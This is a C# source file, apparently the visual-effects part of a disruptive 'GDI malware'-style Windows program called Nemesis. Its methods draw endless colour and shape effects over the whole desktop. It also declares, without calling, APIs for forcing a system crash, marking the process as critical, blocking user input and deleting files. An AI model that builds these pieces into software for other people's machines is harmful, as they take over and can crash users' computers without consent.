﻿using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Nemesis
{
    public class EffectsGdiSpeciais
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetCursorPos(int x, int y); [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
        const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        const uint MOUSEEVENTF_MOVE = 0x0001;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_XDOWN = 0x0080;
        const uint MOUSEEVENTF_XUP = 0x0100;
        const uint MOUSEEVENTF_WHEEL = 0x0800;
        const uint MOUSEEVENTF_HWHEEL = 0x01000;

        public enum MouseEventFlags : uint
        {
            LEFTDOWN = 0x00000002,
            LEFTUP = 0x00000004,
            MIDDLEDOWN = 0x00000020,
            MIDDLEUP = 0x00000040,
            MOVE = 0x00000001,
            ABSOLUTE = 0x00008000,
            RIGHTDOWN = 0x00000008,
            RIGHTUP = 0x00000010,
            WHEEL = 0x00000800,
            XDOWN = 0x00000080,
            XUP = 0x00000100
        }

        public enum MouseEventDataXButtons : uint
        {
            XBUTTON1 = 0x00000001,
            XBUTTON2 = 0x00000002
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void Sleep(uint dwMilliseconds);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreatePen(PenStyle fnPenStyle, int nWidth, uint crColor);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern bool MoveToEx(IntPtr hdc, int X, int Y, IntPtr lpPoint);
        [DllImport("gdi32.dll", SetLastError = true)]
        static extern bool MaskBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, IntPtr hbmMask, int xMask, int yMask, uint rop);
        [DllImport("gdi32.dll")]
        static extern bool LineTo(IntPtr hdc, int nXEnd, int nYEnd);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", ExactSpelling = true, PreserveSig = true, SetLastError = true)]
        static extern IntPtr Ellipse(IntPtr hdc, int nLeftRect, int nTopRect,
        int nRightRect, int nBottomRect);
        [DllImport("msimg32.dll", SetLastError = true)]
        private static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLENDFUNCTION blendFunction);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern bool FloodFill(IntPtr hdc, int nXStart, int nYStart, uint crFill);
        [DllImport("gdi32.dll", EntryPoint = "GdiGradientFill", ExactSpelling = true)]
        public static extern bool GradientFill(
        IntPtr hdc,
        TRIVERTEX[] pVertex,
        uint dwNumVertex,
        GRADIENT_RECT[] pMesh,
        uint dwNumMesh,
        GRADIENT_FILL dwMode);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern bool FillRgn(IntPtr hdc, IntPtr hrgn, IntPtr hbr);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateRectRgn(int nLeftRect, int nTopRect, int nRightRect,
        int nBottomRect);
        [DllImport("gdi32.dll")]
        static extern bool Pie(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect,
        int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2);
        [DllImport("gdi32.dll")]
        static extern bool Polygon(IntPtr hdc, Point[] lpPoints, int nCount);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("gdi32.dll")]
        static extern uint SetPixel(IntPtr hdc, int X, int Y, int crColor);
        [DllImport("gdi32.dll")]
        static extern IntPtr GetPixel(IntPtr hdc, int nXPos, int nYPos);
        [DllImport("gdi32.dll")]
        static extern bool AngleArc(IntPtr hdc, int X, int Y, uint dwRadius,
        float eStartAngle, float eSweepAngle);
        [DllImport("gdi32.dll")]
        static extern bool RoundRect(IntPtr hdc, int nLeftRect, int nTopRect,
        int nRightRect, int nBottomRect, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool DeleteMetaFile(IntPtr hmf);
        [DllImport("gdi32.dll")]
        static extern bool CancelDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern bool Polygon(IntPtr hdc, POINT[] lpPoints, int nCount);
        [DllImport("gdi32.dll")]

        static extern int SetBitmapBits(IntPtr hbmp, int cBytes, RGBQUAD[] lpBits);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Beep(uint dwFreq, uint dwDuration);

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr LoadImage(IntPtr hinst, string lpszName, uint uType,
        int cxDesired, int cyDesired, uint fuLoad);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int DestroyIcon(IntPtr hIcon);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr LoadLibraryEx(IntPtr lpFileName, IntPtr hFile, LoadLibraryFlags dwFlags);

        [DllImport("user32.dll")]
        static extern IntPtr LoadBitmap(IntPtr hInstance, string lpBitmapName);

        [DllImport("user32.dll")]
        static extern IntPtr BeginPaint(IntPtr hwnd, out PAINTSTRUCT lpPaint);

        [DllImport("user32.dll")]
        static extern bool EndPaint(IntPtr hWnd, out PAINTSTRUCT lpPaint);

        [DllImport("gdi32.dll")]
        static extern int SetStretchBltMode(IntPtr hdc, StretchBltMode iStretchMode);

        [DllImport("gdi32.dll")]
        static extern int StretchDIBits(IntPtr hdc, int XDest, int YDest,
        int nDestWidth, int nDestHeight, int XSrc, int YSrc, int nSrcWidth,
        int nSrcHeight, RGBQUAD rgbq, [In] ref BITMAPINFO lpBitsInfo, DIB_Color_Mode dib_mode,
        TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp);

        [DllImport("Gdi32", EntryPoint = "GetBitmapBits")]
        private extern static long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, RGBQUAD[] lpvBits);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateHatchBrush(int iHatch, uint Color);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreatePatternBrush(IntPtr hbmp);
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateDIBitmap(IntPtr hdc, [In] ref BITMAPINFOHEADER
        lpbmih, uint fdwInit, byte[] lpbInit, [In] ref BITMAPINFO lpbmi,
        uint fuUsage);
        [DllImport("gdi32.dll")]
        static extern int SetDIBitsToDevice(IntPtr hdc, int XDest, int YDest, uint
        dwWidth, uint dwHeight, int XSrc, int YSrc, uint uStartScan, uint cScanLines,
        byte[] lpvBits, [In] ref BITMAPINFO lpbmi, uint fuColorUse);
        [DllImport("gdi32.dll")]
        static extern IntPtr SetDIBits(IntPtr hdc, IntPtr hbm, uint start, int line, int lpBits, [In] ref BITMAPINFO lpbmi, DIB_Color_Mode ColorUse);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlAdjustPrivilege(ulong privilege, bool enablePrivilege, bool isThreadPrivilege, out bool previousValue);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetFileAttributes(string lpFileName, FileAttributes dwFileAttributes);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool DeleteFile(string lpFileName);
        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct RAMP
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Red;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Green;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Blue;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;

            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
            public RGBQUAD[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
            public uint biCompression;

            public void Init()
            {
                biSize = (uint)Marshal.SizeOf(this);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
        enum BitmapCompressionMode : uint
        {
            BI_RGB = 0,
            BI_RLE8 = 1,
            BI_RLE4 = 2,
            BI_BITFIELDS = 3,
            BI_JPEG = 4,
            BI_PNG = 5
        }

        enum DIB_Color_Mode : uint
        {
            DIB_RGB_COLORS = 0,
            DIB_PAL_COLORS = 1
        }

        private enum StretchBltMode : int
        {
            STRETCH_ANDSCANS = 1,
            STRETCH_ORSCANS = 2,
            STRETCH_DELETESCANS = 3,
            STRETCH_HALFTONE = 4,
        }

        private const uint MB_OK = 0x00000000;
        private const uint MB_OKCANCEL = 0x00000001;
        private const uint MB_YESNO = 0x00000004;
        private const uint MB_YESNOCANCEL = 0x00000003;
        private const uint MB_ICONEXCLAMATION = 0x00000030;
        private const uint MB_ICONWARNING = 0x00000030;
        private const uint MB_ICONINFORMATION = 0x00000040;
        private const uint MB_ICONQUESTION = 0x00000020;
        private const uint MB_DEFBUTTON1 = 0x00000000;
        private const uint MB_DEFBUTTON2 = 0x00000100;
        private const uint MB_DEFBUTTON3 = 0x00000200;
        private const uint MB_DEFBUTTON4 = 0x00000300;


        public const int LR_DEFAULTCOLOR = 0x0000;
        public const int LR_MONOCHROME = 0x0001;
        public const int LR_COPYRETURNORG = 0x0004;
        public const int LR_COPYDELETEORG = 0x0008;
        public const int LR_LOADFROMFILE = 0x0010;
        public const int LR_LOADTRANSPARENT = 0x0020;
        public const int LR_DEFAULTSIZE = 0x0040;
        public const int LR_VGACOLOR = 0x0080;
        public const int LR_LOADMAP3DCOLORS = 0x1000;
        public const int LR_CREATEDIBSECTION = 0x2000;
        public const int LR_COPYFROMRESOURCE = 0x4000;
        public const int LR_SHARED = 0x8000;

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        private const int SW_HIDE = 0;
        private const int SW_SHOWNORMAL = 1;
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_SHOWNOACTIVATE = 4;
        private const int SW_SHOW = 5;
        private const int SW_MINIMIZE = 6;
        private const int SW_SHOWMINNOACTIVE = 7;
        private const int SW_SHOWNA = 8;
        private const int SW_RESTORE = 9;
        private const int SW_SHOWDEFAULT = 10;
        private const int SW_FORCEMINIMIZE = 11;

        private const uint STATUS_ASSERTION_FAILURE = 0xC0000420;

        private const uint INFINITE = 0xFFFFFFFF;

        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;

        [StructLayout(LayoutKind.Sequential)]
        struct PAINTSTRUCT
        {
            public IntPtr hdc;
            public bool fErase;
            public RECT rcPaint;
            public bool fRestore;
            public bool fIncUpdate;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)] public byte[] rgbReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left, Top, Right, Bottom;

            public RECT(int left, int top, int right, int bottom)
            {
                Left = left;
                Top = top;
                Right = right;
                Bottom = bottom;
            }

            public RECT(System.Drawing.Rectangle r) : this(r.Left, r.Top, r.Right, r.Bottom) { }

            public int X
            {
                get { return Left; }
                set { Right -= (Left - value); Left = value; }
            }

            public int Y
            {
                get { return Top; }
                set { Bottom -= (Top - value); Top = value; }
            }

            public int Height
            {
                get { return Bottom - Top; }
                set { Bottom = value + Top; }
            }

            public int Width
            {
                get { return Right - Left; }
                set { Right = value + Left; }
            }

            public System.Drawing.Point Location
            {
                get { return new System.Drawing.Point(Left, Top); }
                set { X = value.X; Y = value.Y; }
            }

            public System.Drawing.Size Size
            {
                get { return new System.Drawing.Size(Width, Height); }
                set { Width = value.Width; Height = value.Height; }
            }

            public static implicit operator System.Drawing.Rectangle(RECT r)
            {
                return new System.Drawing.Rectangle(r.Left, r.Top, r.Width, r.Height);
            }

            public static implicit operator RECT(System.Drawing.Rectangle r)
            {
                return new RECT(r);
            }

            public static bool operator ==(RECT r1, RECT r2)
            {
                return r1.Equals(r2);
            }

            public static bool operator !=(RECT r1, RECT r2)
            {
                return !r1.Equals(r2);
            }

            public bool Equals(RECT r)
            {
                return r.Left == Left && r.Top == Top && r.Right == Right && r.Bottom == Bottom;
            }

            public override bool Equals(object obj)
            {
                if (obj is RECT)
                    return Equals((RECT)obj);
                else if (obj is System.Drawing.Rectangle)
                    return Equals(new RECT((System.Drawing.Rectangle)obj));
                return false;
            }

            public override int GetHashCode()
            {
                return ((System.Drawing.Rectangle)this).GetHashCode();
            }

            public override string ToString()
            {
                return string.Format(System.Globalization.CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", Left, Top, Right, Bottom);
            }
        }

        private enum LoadLibraryFlags : uint
        {
            DONT_RESOLVE_DLL_REFERENCES = 0x00000001,
            LOAD_IGNORE_CODE_AUTHZ_LEVEL = 0x00000010,
            LOAD_LIBRARY_AS_DATAFILE = 0x00000002,
            LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 0x00000040,
            LOAD_LIBRARY_AS_IMAGE_RESOURCE = 0x00000020,
            LOAD_WITH_ALTERED_SEARCH_PATH = 0x00000008,
        }

        private enum PenStyle : int
        {
            PS_SOLID = 0,
            PS_DASH = 1,
            PS_DOT = 2,
            PS_DASHDOT = 3,
            PS_DASHDOTDOT = 4,
            PS_NULL = 5,
            PS_INSIDEFRAME = 6,

            PS_USERSTYLE = 7,
            PS_ALTERNATE = 8,
            PS_STYLE_MASK = 0x0000000F,

            PS_ENDCAP_ROUND = 0x00000000,
            PS_ENDCAP_SQUARE = 0x00000100,
            PS_ENDCAP_FLAT = 0x00000200,
            PS_ENDCAP_MASK = 0x00000F00,

            PS_JOIN_ROUND = 0x00000000,
            PS_JOIN_BEVEL = 0x00001000,
            PS_JOIN_MITER = 0x00002000,
            PS_JOIN_MASK = 0x0000F000,

            PS_COSMETIC = 0x00000000,
            PS_GEOMETRIC = 0x00010000,
            PS_TYPE_MASK = 0x000F0000,
        };

        public enum TernaryRasterOperations : uint
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
            CAPTUREBLT = 0x40000000,
            CUSTOM = 0x00100C85,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }


        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct BLENDFUNCTION
        {
            public byte BlendOp;
            public byte BlendFlags;
            public byte SourceConstantAlpha;
            public byte AlphaFormat;
        }

        const int AC_SRC_OVER = 0x00;

        const int AC_SRC_ALPHA = 0x01;

        [StructLayout(LayoutKind.Sequential)]
        public struct GRADIENT_RECT
        {
            public uint UpperLeft;
            public uint LowerRight;

            public GRADIENT_RECT(uint upLeft, uint lowRight)
            {
                this.UpperLeft = upLeft;
                this.LowerRight = lowRight;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TRIVERTEX
        {
            public int x;
            public int y;
            public ushort Red;
            public ushort Green;
            public ushort Blue;
            public ushort Alpha;

            public TRIVERTEX(int x, int y, ushort red, ushort green, ushort blue, ushort alpha)
            {
                this.x = x;
                this.y = y;
                this.Red = red;
                this.Green = green;
                this.Blue = blue;
                this.Alpha = alpha;
            }
        }

        public enum GRADIENT_FILL : uint
        {
            RECT_H = 0,
            RECT_V = 1,
            TRIANGLE = 2,
            OP_FLAG = 0xff
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct GRADIENT_TRIANGLE
        {
            public uint Vertex1;
            public uint Vertex2;
            public uint Vertex3;

            public GRADIENT_TRIANGLE(uint vertex1, uint vertex2, uint vertex3)
            {
                this.Vertex1 = vertex1;
                this.Vertex2 = vertex2;
                this.Vertex3 = vertex3;
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        public static void DesForm()
        {
            IntPtr desk = GetDC(IntPtr.Zero);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            int size = 70; // Tamanho da forma
            int x = w / 2;
            int y = h / 2;
            int xDirection = 1;
            int yDirection = 1;
            int speed = 10;

            int r = 255, g = 0, b = 0;
            double angle = 0;

            Shape currentShape = Shape.Square;

            while (true)
            {
                if (r > 0 && b == 0)
                {
                    r--;
                    g++;
                }
                if (g > 0 && r == 0)
                {
                    g--;
                    b++;
                }
                if (b > 0 && g == 0)
                {
                    b--;
                    r++;
                }

                uint color = (uint)((r << 16) | (g << 8) | b);

                IntPtr brush = CreateSolidBrush(color);
                IntPtr oldBrush = SelectObject(desk, brush);

                Point[] points = GetShapePoints(x, y, size, currentShape, angle);

                Polygon(desk, points, points.Length);
                SelectObject(desk, oldBrush);
                DeleteObject(brush);

                x += xDirection * speed;
                y += yDirection * speed;

                if (x - size <= 0 || x + size >= w)
                {
                    xDirection *= -1;
                    currentShape = GetNextShape(currentShape);
                }
                if (y - size <= 0 || y + size >= h)
                {
                    yDirection *= -1;
                    currentShape = GetNextShape(currentShape);
                }

                angle += 0.05; // Incrementar o ângulo para rotação
                Sleep(10);
            }

            ReleaseDC(GetDesktopWindow(), desk);
        }

        // Função para obter os pontos de uma forma com rotação
        public static Point[] GetShapePoints(int centerX, int centerY, int size, Shape shape, double angle)
        {
            int numPoints = GetNumberOfPoints(shape);

            Point[] points = new Point[numPoints];
            double step = 2 * Math.PI / numPoints;

            for (int i = 0; i < numPoints; i++)
            {
                double currentAngle = i * step + angle;
                int xOffset = (int)(size * Math.Cos(currentAngle));
                int yOffset = (int)(size * Math.Sin(currentAngle));
                points[i] = RotatePoint(centerX, centerY, centerX + xOffset, centerY + yOffset, angle);
            }

            return points;
        }

        // Função para rotacionar um ponto em torno de um ponto central
        public static Point RotatePoint(int centerX, int centerY, int x, int y, double angle)
        {
            double radians = angle;
            double cosTheta = Math.Cos(radians);
            double sinTheta = Math.Sin(radians);

            int newX = (int)(cosTheta * (x - centerX) - sinTheta * (y - centerY) + centerX);
            int newY = (int)(sinTheta * (x - centerX) + cosTheta * (y - centerY) + centerY);

            return new Point(newX, newY);
        }

        // Função para obter a quantidade de pontos para a forma
        public static int GetNumberOfPoints(Shape shape)
        {
            switch (shape)
            {
                case Shape.Square: return 4;
                case Shape.Triangle: return 3;
                case Shape.Hexagon: return 6;
                case Shape.Pentagon: return 5;
                default: return 4;
            }
        }

        // Função para obter a próxima forma na sequência
        public static Shape GetNextShape(Shape current)
        {
            switch (current)
            {
                case Shape.Square: return Shape.Triangle;
                case Shape.Triangle: return Shape.Hexagon;
                case Shape.Hexagon: return Shape.Pentagon;
                case Shape.Pentagon: return Shape.Square;
                default: return Shape.Square;
            }
        }

        // Enumeração das formas
        public enum Shape
        {
            Square,
            Triangle,
            Hexagon,
            Pentagon
        }

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO bmi, uint Usage, out IntPtr bits, IntPtr hSection, uint dwOffset);

        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        private const int BI_RGB = 0;
        private const uint DIB_RGB_COLORS = 0;

        public static void DesPart()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = -h; // Corrigir para orientação correta
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr bits;
            IntPtr hBitmap = CreateDIBSection(dc, ref bmpi, DIB_RGB_COLORS, out bits, IntPtr.Zero, 0);
            SelectObject(dcCopy, hBitmap);

            while (true)
            {
                StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, TernaryRasterOperations.SRCCOPY);

                unsafe
                {
                    RGBQUAD* rgbquad = (RGBQUAD*)bits;

                    for (int x = 0; x < w; x++)
                    {
                        for (int y = 0; y < h; y++)
                        {
                            int index = y * w + x;
                            rgbquad[index].rgbRed = (byte)(128 + 127 * Math.Sin(x * 0.01 + Environment.TickCount * 0.01));
                            rgbquad[index].rgbGreen = (byte)(128 + 127 * Math.Sin(y * 0.01 + Environment.TickCount * 0.01));     // TRANSFORMAÇÕES
                            rgbquad[index].rgbBlue = (byte)(128 + 127 * Math.Sin((x + y) * 0.01 + Environment.TickCount * 0.01));
                            rgbquad[index].rgbReserved = 100;
                        }
                    }
                }

                BLENDFUNCTION blendFunction = new BLENDFUNCTION
                {
                    BlendOp = AC_SRC_OVER,
                    BlendFlags = 0,
                    SourceConstantAlpha = 255,
                    AlphaFormat = 1 // Use AC_SRC_ALPHA
                };

                AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blendFunction);

                Thread.Sleep(20);
            }
        }

        private const int NUM_LINES = 1000;
        private const int LINE_LENGTH = 50;
        private const int MAX_STEP = 5;

        struct Line
        {
            public int x1, y1, x2, y2;
            public float angle1, angle2;
            public Color color;
        }
        public static void LinesEff()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            IntPtr hBitmap = CreateCompatibleBitmap(dc, w, h);
            SelectObject(dcCopy, hBitmap);

            Random random = new Random();
            Line[] lines = new Line[NUM_LINES];

            // Inicializa as linhas
            for (int i = 0; i < NUM_LINES; i++)
            {
                lines[i].x1 = random.Next(0, w);
                lines[i].y1 = random.Next(0, h);
                lines[i].x2 = lines[i].x1 + LINE_LENGTH * (random.Next(2) == 0 ? 1 : -1);
                lines[i].y2 = lines[i].y1 + LINE_LENGTH * (random.Next(2) == 0 ? 1 : -1);
                lines[i].angle1 = (float)(random.NextDouble() * 2 * Math.PI);
                lines[i].angle2 = (float)(random.NextDouble() * 2 * Math.PI);
                lines[i].color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));
            }

            using (Graphics g = Graphics.FromHdc(dc))
            {
                while (true)
                {
                    BitBlt(dcCopy, 0, 0, w, h, IntPtr.Zero, 0, 0, TernaryRasterOperations.BLACKNESS);

                    for (int i = 0; i < NUM_LINES; i++)
                    {
                        using (Pen pen = new Pen(lines[i].color, 2))
                        {
                            g.DrawLine(pen, lines[i].x1, lines[i].y1, lines[i].x2, lines[i].y2);
                        }

                        // Atualiza as coordenadas das linhas
                        lines[i].x1 += (int)(Math.Cos(lines[i].angle1) * MAX_STEP);
                        lines[i].y1 += (int)(Math.Sin(lines[i].angle1) * MAX_STEP);
                        lines[i].x2 += (int)(Math.Cos(lines[i].angle2) * MAX_STEP);
                        lines[i].y2 += (int)(Math.Sin(lines[i].angle2) * MAX_STEP);

                        // Reflete nas bordas da tela
                        if (lines[i].x1 < 0 || lines[i].x1 >= w || lines[i].x2 < 0 || lines[i].x2 >= w)
                        {
                            lines[i].angle1 = (float)Math.PI - lines[i].angle1;
                            lines[i].angle2 = (float)Math.PI - lines[i].angle2;
                        }
                        if (lines[i].y1 < 0 || lines[i].y1 >= h || lines[i].y2 < 0 || lines[i].y2 >= h)
                        {
                            lines[i].angle1 = -lines[i].angle1;
                            lines[i].angle2 = -lines[i].angle2;
                        }
                    }

                    Thread.Sleep(10);
                }
            }

            DeleteObject(hBitmap);
            ReleaseDC(IntPtr.Zero, dc);
        }
    }
}
